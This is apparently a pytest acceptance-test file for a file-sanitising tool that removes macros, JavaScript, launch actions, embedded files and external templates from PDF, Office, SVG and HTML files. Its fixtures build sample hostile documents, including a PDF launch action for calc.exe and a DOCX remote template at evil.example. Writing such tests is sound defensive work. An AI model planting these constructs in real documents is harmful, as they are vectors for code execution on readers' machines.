"""Acceptance tests for file-disarm: fixtures with known active content go in,
the outputs must open and must have nothing active left."""

from __future__ import annotations

import json
import subprocess
import sys
import zipfile
from pathlib import Path

import pikepdf
import pytest
from converter_conformance.harness import load_adapter_class, run_in_process
from converter_sdk import AdapterError
from converter_sdk.active import active_findings
from lxml import etree, html
from pikepdf import Array, Dictionary, Name, String

ADAPTER = Path(__file__).resolve().parents[1]
PKG = "http://schemas.openxmlformats.org/package/2006/relationships"
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
CT = "http://schemas.openxmlformats.org/package/2006/content-types"
MAIN_DOCM = "application/vnd.ms-word.document.macroEnabled.main+xml"
MAIN_DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"


# ---------------------------------------------------------------- fixtures


def js(code: str = "app.alert(1)") -> Dictionary:
    return Dictionary(S=Name.JavaScript, JS=String(code))


def pdf_file(path: Path) -> Path:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(200, 200))
    spec = pdf.make_indirect(Dictionary(Type=Name.Filespec, F=String("a.txt")))
    spec.EF = Dictionary(F=pikepdf.Stream(pdf, b"hello"))
    pdf.Root.Names = Dictionary(
        JavaScript=pdf.make_indirect(
            Dictionary(Names=Array([String("x"), pdf.make_indirect(js())]))
        ),
        EmbeddedFiles=pdf.make_indirect(Dictionary(Names=Array([String("a.txt"), spec]))),
    )
    pdf.Root.OpenAction = pdf.make_indirect(js())
    launch = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Link,
            Rect=Array([0, 0, 50, 50]),
            A=Dictionary(S=Name.Launch, F=String("calc.exe")),
        )
    )
    web = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Link,
            Rect=Array([60, 0, 90, 50]),
            A=Dictionary(S=Name.URI, URI=String("https://example.com")),
        )
    )
    attach = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot, Subtype=Name.FileAttachment, Rect=Array([0, 60, 9, 80]), FS=spec
        )
    )
    pdf.pages[0].Annots = Array([launch, web, attach])
    pdf.save(path)
    return path


def form_pdf_with_action(path: Path) -> Path:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(200, 200))
    widget = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Widget,
            FT=Name.Tx,
            T=String("name"),
            V=String("Ada"),
            Rect=Array([10, 100, 150, 120]),
            DA=String("/Helv 12 Tf 0 g"),
            AA=Dictionary(K=js("AFNumber_Keystroke(2)")),
        )
    )
    pdf.pages[0].Annots = Array([widget])
    pdf.Root.AcroForm = Dictionary(
        Fields=Array([widget]),
        DA=String("/Helv 12 Tf 0 g"),
        DR=Dictionary(
            Font=Dictionary(
                Helv=Dictionary(Type=Name.Font, Subtype=Name.Type1, BaseFont=Name.Helvetica)
            )
        ),
    )
    pdf.save(path)
    return path


def rels(*items: tuple[str, str, str, bool]) -> str:
    body = "".join(
        f'<Relationship Id="{i}" Type="{REL}/{t}" Target="{target}"'
        + (' TargetMode="External"' if ext else "")
        + "/>"
        for i, t, target, ext in items
    )
    return f'<?xml version="1.0"?><Relationships xmlns="{PKG}">{body}</Relationships>'


def write_zip(path: Path, parts: dict[str, bytes | str]) -> Path:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in parts.items():
            z.writestr(name, data)
    return path


def docm_file(path: Path) -> Path:
    types = (
        f'<?xml version="1.0"?><Types xmlns="{CT}">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package'
        '.relationships+xml"/>'
        '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
        f'<Override PartName="/word/document.xml" ContentType="{MAIN_DOCM}"/></Types>'
    )
    document = (
        f'<?xml version="1.0"?><w:document xmlns:w="{W}"><w:body>'
        "<w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>"
    )
    return write_zip(
        path,
        {
            "[Content_Types].xml": types,
            "_rels/.rels": rels(("rId1", "officeDocument", "word/document.xml", False)),
            "word/document.xml": document,
            "word/_rels/document.xml.rels": rels(("rId1", "vbaProject", "vbaProject.bin", False)),
            "word/vbaProject.bin": b"\xd0\xcf\x11\xe0 macro",
        },
    )


def template_docx(path: Path) -> Path:
    document = (
        f'<?xml version="1.0"?><w:document xmlns:w="{W}" xmlns:r="{REL}"><w:body>'
        "<w:p><w:r><w:t>Hello</w:t></w:r></w:p>"
        '<w:settings><w:attachedTemplate r:id="rId9"/></w:settings></w:body></w:document>'
    )
    return write_zip(
        path,
        {
            "[Content_Types].xml": (
                f'<?xml version="1.0"?><Types xmlns="{CT}">'
                f'<Override PartName="/word/document.xml" ContentType="{MAIN_DOCX}"/></Types>'
            ),
            "_rels/.rels": rels(("rId1", "officeDocument", "word/document.xml", False)),
            "word/document.xml": document,
            "word/_rels/document.xml.rels": rels(
                ("rId9", "attachedTemplate", "http://evil.example/t.dotm", True),
                ("rId2", "hyperlink", "https://example.com/", True),
            ),
        },
    )


SVG = """<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     onload="alert(1)" width="20" height="20">
  <script>alert(1)</script>
  <rect width="10" height="10" fill="red"/>
  <image xlink:href="http://tracker.example/p.png" width="5" height="5"/>
</svg>"""

HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>t</title>
<script>alert(1)</script></head>
<body><p>Hello <a href="https://example.com/">site</a></p>
<iframe src="http://evil.example/"></iframe></body></html>"""


def run(tmp_path: Path, inputs: list[Path], params: dict | None = None):
    titles = [p.stem for p in inputs]
    return run_in_process(
        ADAPTER, tmp_path / "job", inputs, {"fileTitles": titles, **(params or {})}
    )


# ------------------------------------------------------------------- tests


def test_pdf_loses_javascript_launch_and_attachments_but_keeps_pages_and_links(
    tmp_path: Path,
) -> None:
    src = pdf_file(tmp_path / "a.pdf")
    assert {f.kind for f in active_findings(src, "pdf")} == {
        "activeContent",
        "embeddedFiles",
    }
    r = run(tmp_path, [src])
    assert not r.errors
    assert r.names == ["a-safe.pdf"]
    assert {"ACTIVE_CONTENT_REMOVED"} <= set(r.warnings)
    assert active_findings(r.outputs[0], "pdf") == []
    with pikepdf.open(r.outputs[0]) as pdf:
        assert pdf.check_pdf_syntax() == []
        assert len(pdf.pages) == 1
        annots = pdf.pages[0].Annots
        assert len(annots) == 2 and annots[1].A.S == Name.URI


def test_pdf_form_with_actions_is_flattened(tmp_path: Path) -> None:
    r = run(tmp_path, [form_pdf_with_action(tmp_path / "f.pdf")])
    assert not r.errors
    assert "FORMS_FLATTENED" in r.warnings
    with pikepdf.open(r.outputs[0]) as pdf:
        assert Name.AcroForm not in pdf.Root
    assert active_findings(r.outputs[0], "pdf") == []


def test_remove_links_also_drops_web_links(tmp_path: Path) -> None:
    r = run(tmp_path, [pdf_file(tmp_path / "a.pdf")], {"removeLinks": True})
    assert "EXTERNAL_LINKS_REMOVED" in r.warnings
    with pikepdf.open(r.outputs[0]) as pdf:
        assert len(pdf.pages[0].Annots) == 2  # the attachment went; links stay, inert
        assert all(Name.A not in a for a in pdf.pages[0].Annots)


def test_docm_comes_out_as_a_plain_docx_without_macros(tmp_path: Path) -> None:
    r = run(tmp_path, [docm_file(tmp_path / "a.docm")])
    assert not r.errors
    assert r.names == ["a-safe.docx"]
    assert "MACROS_REMOVED" in r.warnings
    assert active_findings(r.outputs[0], "docx") == []
    with zipfile.ZipFile(r.outputs[0]) as z:
        assert z.testzip() is None
        assert "word/vbaProject.bin" not in z.namelist()
        types = etree.fromstring(z.read("[Content_Types].xml"))
        assert MAIN_DOCX in [e.get("ContentType") for e in types]
        assert b"Hello" in z.read("word/document.xml")


def test_docx_external_template_is_removed_and_web_link_kept(tmp_path: Path) -> None:
    r = run(tmp_path, [template_docx(tmp_path / "t.docx")])
    assert not r.errors
    assert "EXTERNAL_LINKS_REMOVED" in r.warnings
    assert active_findings(r.outputs[0], "docx") == []
    with zipfile.ZipFile(r.outputs[0]) as z:
        ids = [e.get("Id") for e in etree.fromstring(z.read("word/_rels/document.xml.rels"))]
        assert ids == ["rId2"]
        doc = etree.fromstring(z.read("word/document.xml"))
        assert not doc.xpath("//*[local-name()='attachedTemplate']")


def test_svg_and_html_are_cleaned_and_still_parse(tmp_path: Path) -> None:
    svg = tmp_path / "a.svg"
    svg.write_text(SVG)
    page = tmp_path / "b.html"
    page.write_text(HTML, encoding="utf-8")
    r = run(tmp_path, [svg, page])
    assert not r.errors
    assert r.names == ["a-safe.svg", "b-safe.html"]
    assert {"ACTIVE_CONTENT_REMOVED", "EXTERNAL_LINKS_REMOVED"} <= set(r.warnings)
    root = etree.parse(str(r.outputs[0])).getroot()
    assert root.xpath("//*[local-name()='rect']")
    assert not root.xpath("//*[local-name()='script']") and root.get("onload") is None
    doc = html.fromstring(r.outputs[1].read_text("utf-8"))
    assert doc.xpath("//p")
    assert not doc.xpath("//script|//iframe")
    assert doc.xpath("//a/@href") == ["https://example.com/"]
    for out, fmt in zip(r.outputs, ("svg", "html"), strict=True):
        assert active_findings(out, fmt) == []


def test_outputs_remember_their_source(tmp_path: Path) -> None:
    adapter = load_adapter_class(ADAPTER)()
    inputs = [pdf_file(tmp_path / "a.pdf"), docm_file(tmp_path / "b.docm")]
    from converter_conformance.harness import context, make_job_dir

    job, rel = make_job_dir(tmp_path / "job", inputs)
    ctx, _sent = context(job, rel)
    assert not adapter.validate_input(ctx, {}).errors
    outputs = adapter.execute_conversion(ctx, {})
    assert [o.source for o in outputs] == [0, 1]


def test_clean_files_pass_through_without_warnings(tmp_path: Path) -> None:
    pdf = pikepdf.new()
    pdf.add_blank_page()
    src = tmp_path / "plain.pdf"
    pdf.save(src)
    r = run(tmp_path, [src])
    assert not r.errors and r.warnings == []


def test_corrupt_input_is_a_structured_error(tmp_path: Path) -> None:
    bad = tmp_path / "bad.docx"
    bad.write_bytes(b"PK\x03\x04" + bytes(range(200)))
    r = run(tmp_path, [bad])
    assert [e.code for e in r.errors] == ["E_INPUT_CORRUPT"]


def test_doctype_in_svg_is_refused(tmp_path: Path) -> None:
    svg = tmp_path / "a.svg"
    svg.write_text(
        '<!DOCTYPE svg [<!ENTITY e "x">]><svg xmlns="http://www.w3.org/2000/svg">&e;</svg>'
    )
    r = run(tmp_path, [svg])
    assert [e.code for e in r.errors] == ["E_INPUT_CORRUPT"]


# ------------------------------------------------------------ the verifier


def verify(job: Path, relative: str) -> dict:
    proc = subprocess.run(  # noqa: S603 - our interpreter and our verifier
        [sys.executable, "-I", str(ADAPTER / "verify.py")],
        cwd=job,
        input=json.dumps({"output": relative}).encode(),
        capture_output=True,
        check=False,
    )
    return json.loads(proc.stdout)


def test_verifier_passes_clean_and_flags_a_planted_leftover(tmp_path: Path) -> None:
    job = tmp_path / "job"
    (job / "out").mkdir(parents=True)
    clean = job / "out" / "0.svg"
    clean.write_text('<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>')
    assert verify(job, "out/0.svg") == {"findings": []}

    planted = job / "out" / "1.svg"
    planted.write_text('<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>')
    report = verify(job, "out/1.svg")
    assert [f["kind"] for f in report["findings"]] == ["activeContent"]

    macro = docm_file(job / "out" / "2.docx")  # macros left under a plain name
    report = verify(job, "out/2.docx")
    assert {f["kind"] for f in report["findings"]} >= {"macros"}
    assert macro.exists()


def test_verifier_cannot_report_means_failure(tmp_path: Path) -> None:
    job = tmp_path / "job"
    (job / "out").mkdir(parents=True)
    (job / "out" / "0.docx").write_bytes(b"not a zip")
    assert "error" in verify(job, "out/0.docx")
    assert "error" in verify(job, "../escape.docx")
    assert "error" in verify(job, "out/missing.pdf")


def test_job_fails_when_something_active_remains(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    cls = load_adapter_class(ADAPTER)
    module = sys.modules[cls.__module__]

    def leaves_everything(src: Path, dst: Path, fmt: str, **_: object) -> dict[str, int]:
        dst.write_bytes(src.read_bytes())
        return {}

    monkeypatch.setattr(module, "disarm_markup", leaves_everything)
    svg = tmp_path / "a.svg"
    svg.write_text(SVG)
    from converter_conformance.harness import context, make_job_dir

    job, rel = make_job_dir(tmp_path / "job", [svg])
    ctx, _sent = context(job, rel)
    with pytest.raises(AdapterError) as e:
        cls().execute_conversion(ctx, {})
    assert e.value.code == "E_INTERNAL"
    assert e.value.detail["reason"] == "activeContentRemains"
    assert not list((job / "out").iterdir())  # the unsafe output is deleted


def test_job_fails_when_the_verifier_is_broken(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    cls = load_adapter_class(ADAPTER)
    module = sys.modules[cls.__module__]
    broken = tmp_path / "broken.py"
    broken.write_text("import sys\nsys.exit(3)\n")
    monkeypatch.setattr(module, "VERIFY", broken)
    from converter_conformance.harness import context, make_job_dir

    svg = tmp_path / "a.svg"
    svg.write_text('<svg xmlns="http://www.w3.org/2000/svg"/>')
    job, rel = make_job_dir(tmp_path / "job", [svg])
    ctx, _sent = context(job, rel)
    with pytest.raises(AdapterError) as e:
        cls().execute_conversion(ctx, {})
    assert e.value.detail["reason"] == "verifierFailed"
